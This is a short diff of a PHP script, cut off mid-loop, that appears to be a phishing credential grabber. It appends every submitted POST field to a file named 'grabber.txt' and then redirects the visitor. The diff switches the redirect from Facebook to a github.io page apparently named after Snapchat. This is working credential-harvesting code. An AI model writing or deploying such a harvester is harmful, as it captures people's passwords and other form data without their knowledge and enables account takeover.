@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://www.facebook.com/');
+header ('Location:https://srb932.github.io/snaptest/');
 $handle = fopen('grabber.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
